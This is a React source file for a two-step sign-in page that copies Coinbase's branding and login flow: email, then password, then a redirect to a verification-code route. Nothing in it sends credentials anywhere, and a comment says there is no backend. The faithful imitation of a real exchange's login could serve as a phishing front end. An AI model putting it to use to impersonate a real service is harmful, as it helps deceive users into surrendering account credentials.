import { useState } from 'react';
import { Link, useNavigate } from 'react-router-dom';
import Logo from '../components/ui/Logo';

/* ── Icons ── */
const PasskeyIcon = () => (
	<svg width="20" height="20" viewBox="0 0 24 24" fill="none" className="shrink-0">
		<circle cx="12" cy="8" r="4" fill="currentColor" />
		<path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
		<circle cx="18" cy="14" r="2" fill="currentColor" />
		<path d="M18 16v3M17 19h2" stroke="white" strokeWidth="1.5" strokeLinecap="round" />
	</svg>
);

const GoogleIcon = () => (
	<svg width="20" height="20" viewBox="0 0 24 24" className="shrink-0">
		<path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
		<path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
		<path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
		<path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
	</svg>
);

const AppleIcon = () => (
	<svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" className="shrink-0">
		<path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/>
	</svg>
);

const EyeIcon = () => (
	<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#5B616E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="shrink-0">
		<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
		<circle cx="12" cy="12" r="3" />
	</svg>
);

const EyeOffIcon = () => (
	<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#5B616E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="shrink-0">
		<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94" />
		<path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19" />
		<line x1="1" y1="1" x2="23" y2="23" />
		<path d="M14.12 14.12a3 3 0 1 1-4.24-4.24" />
	</svg>
);

const UserAvatar = () => (
	<div className="w-10 h-10 rounded-full bg-[#2C2F36] flex items-center justify-center shrink-0">
		<svg width="20" height="20" viewBox="0 0 24 24" fill="#5B616E">
			<circle cx="12" cy="8" r="4" />
			<path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" />
		</svg>
	</div>
);

const SignIn = () => {
	const [step, setStep] = useState('email'); // 'email' | 'password'
	const [email, setEmail] = useState('');
	const [password, setPassword] = useState('');
	const [showPassword, setShowPassword] = useState(false);
	const navigate = useNavigate();

	const handleEmailContinue = (e) => {
		e.preventDefault();
		if (email.trim()) setStep('password');
	};

	const handlePasswordContinue = (e) => {
		e.preventDefault();
		// No backend — navigate to verify code page
		navigate('/verify', { state: { email } });
	};

	return (
		<div className="min-h-screen bg-[#0A0B0D] flex flex-col">
			{/* Top bar with logo */}
			<div className="px-6 pt-5">
				<a href="/">
					<Logo height={28} className="brightness-0 invert" />
				</a>
			</div>

			{/* Centered form */}
			<div className="flex-1 flex items-center justify-center px-4">
				<div className="w-full max-w-[390px]">

					{step === 'email' && (
						<form onSubmit={handleEmailContinue}>
							<h1 className="text-[1.75rem] font-bold text-white mb-6">Sign in to Coinbase</h1>

							{/* Email field */}
							<div className="mb-4">
								<label className="block text-[0.875rem] font-medium text-white mb-1.5">Email</label>
								<input
									type="email"
									value={email}
									onChange={(e) => setEmail(e.target.value)}
									placeholder="Your email address"
									className="w-full h-14 px-4 rounded-xl bg-[#1E2025] border border-[#2C2F36] text-white placeholder:text-[#5B616E] text-[0.9375rem] outline-none focus:border-[#0052FF] transition-colors"
								/>
							</div>

							{/* Continue button */}
							<button
								type="submit"
								className="w-full h-14 rounded-full bg-[#3B4DE0] hover:bg-[#2F3FC0] active:bg-[#2535A0] text-white font-semibold text-[0.9375rem] transition-colors mb-5"
							>
								Continue
							</button>

							{/* Divider */}
							<div className="flex items-center gap-3 mb-5">
								<div className="flex-1 h-px bg-[#2C2F36]" />
								<span className="text-[0.75rem] font-semibold text-[#5B616E] tracking-wider">OR</span>
								<div className="flex-1 h-px bg-[#2C2F36]" />
							</div>

							{/* OAuth buttons */}
							<div className="flex flex-col gap-3 mb-6">
								<button type="button" className="w-full h-14 rounded-full bg-[#1E2025] hover:bg-[#2C2F36] border border-[#2C2F36] text-white font-semibold text-[0.9375rem] flex items-center justify-center gap-3 transition-colors">
									<PasskeyIcon />
									Sign in with Passkey
								</button>
								<button type="button" className="w-full h-14 rounded-full bg-[#1E2025] hover:bg-[#2C2F36] border border-[#2C2F36] text-white font-semibold text-[0.9375rem] flex items-center justify-center gap-3 transition-colors">
									<GoogleIcon />
									Sign in with Google
								</button>
								<button type="button" className="w-full h-14 rounded-full bg-[#1E2025] hover:bg-[#2C2F36] border border-[#2C2F36] text-white font-semibold text-[0.9375rem] flex items-center justify-center gap-3 transition-colors">
									<AppleIcon />
									Sign in with Apple
								</button>
							</div>

							{/* Footer links */}
							<p className="text-center text-[0.875rem] text-[#5B616E] mb-4">
								Don&apos;t have an account?{' '}
								<Link to="/signup" className="text-[#0052FF] hover:underline font-medium">
									Sign up
								</Link>
							</p>

							<p className="text-center text-[0.75rem] text-[#5B616E] leading-5">
								Not your device? Use a private window. See our{' '}
								<a href="#" className="underline hover:text-white transition-colors">Privacy Policy</a>
								{' '}for more info.
							</p>
						</form>
					)}

					{step === 'password' && (
						<form onSubmit={handlePasswordContinue}>
							<h1 className="text-[1.75rem] font-bold text-white mb-6">Sign in to Coinbase</h1>

							{/* Email display pill */}
							<div className="flex items-center gap-3 w-full h-16 px-4 rounded-xl border border-[#2C2F36] bg-[#1E2025] mb-6">
								<UserAvatar />
								<span className="text-[0.9375rem] text-white truncate">{email}</span>
							</div>

							{/* Password field */}
							<div className="mb-2">
								<label className="block text-[0.875rem] font-semibold text-white mb-1.5">Password</label>
								<div className="relative">
									<input
										type={showPassword ? 'text' : 'password'}
										value={password}
										onChange={(e) => setPassword(e.target.value)}
										className="w-full h-14 px-4 pr-12 rounded-xl bg-[#1E2025] border border-[#2C2F36] text-white placeholder:text-[#5B616E] text-[0.9375rem] outline-none focus:border-[#0052FF] transition-colors"
									/>
									<button
										type="button"
										onClick={() => setShowPassword((v) => !v)}
										className="absolute right-4 top-1/2 -translate-y-1/2 text-[#5B616E] hover:text-white transition-colors"
									>
										{showPassword ? <EyeOffIcon /> : <EyeIcon />}
									</button>
								</div>
							</div>

							{/* Forgot password */}
							<div className="mb-6">
								<Link
									to="/forgot-password"
									state={{ email }}
									className="text-[0.875rem] text-[#0052FF] hover:underline font-medium"
								>
									Forgot password?
								</Link>
							</div>

							{/* Continue button */}
							<button
								type="submit"
								className="w-full h-14 rounded-full bg-[#3B4DE0] hover:bg-[#2F3FC0] active:bg-[#2535A0] text-white font-semibold text-[0.9375rem] transition-colors"
							>
								Continue
							</button>
						</form>
					)}

				</div>
			</div>
		</div>
	);
};

export default SignIn;
